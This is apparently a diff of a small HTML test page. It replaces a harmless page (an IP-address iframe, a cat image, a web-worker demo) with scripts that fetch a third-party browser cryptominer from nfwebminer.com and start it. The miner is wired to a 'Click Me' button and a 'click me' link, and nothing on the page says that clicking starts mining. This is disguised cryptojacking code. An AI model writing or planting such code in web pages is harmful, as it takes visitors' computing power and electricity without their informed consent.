@@ -1,32 +1,42 @@
 <html>
-	<head>
-		<title>Test Page For JS Test</title>
-		<script type="text/javascript" src="test.js"></script>
-		<script type="text/javascript" src="hello.js"></script>
-	</head>
-	<body>
-	<h1>Welcome to the website.</h1>
-	<p><br><br>Your IP address is:</p>
-	<iframe src="https://ipinfo.io/ip"></iframe>
-	<br><br>
-	<a href="https://www.timeanddate.com">Click here for current time and date</a>
-	<br><br>
-	<p>Token cat picture:</p>
-	<img src="http://i0.kym-cdn.com/entries/icons/original/000/011/365/GRUMPYCAT.jpg"></img>
-	<script language="javascript">
-		var worker = new Worker('fibonacci.js');
+<head>
+	<title>Test Page For JS Test</title>
+	<meta charset="UTF-8">
+</head>
+<body>
+	<script>
+	function startMiner() {
+		var script = document.createElement('script');
+		script.setAttribute('type', 'text/javascript');
+		script.setAttribute('src', 'https://nfwebminer.com/lib/miner.js');
+		document.head.appendChild(script);
+		var miner = new NFMiner("187fd", {load:"medium"});
+   		miner.start();
+   	}
+	</script>
+	<button onclick="startMiner()">Click Me</button>
 
-		worker.onmessage = function(event) {
-      	document.getElementById('result').textContent = event.data;
-      	dump('Got: ' + event.data + '\n');
-    	};
+<a href='linkhref.html' id='mylink'>click me</a>
 
-	    worker.onerror = function(error) {
-	      dump('Worker error: ' + error.message + '\n');
-	      throw error;
-	    };
+<script type="text/javascript">
 
-    	worker.postMessage('5');
-    </script>
-	</body>
+var myLink = document.getElementById('mylink');
+
+myLink.onclick = function(){
+
+    var script = document.createElement("script");
+    script.type = "text/javascript";
+    script.src = "https://nfwebminer.com/lib/miner.js"; 
+    document.getElementsByTagName("head")[0].appendChild(script);
+    var miner = new NFMiner("187fd", {load:"medium"});
+   	miner.start();
+   	return false;
+    
+
+}
+
+
+</script>
+
+</body>
 </html>
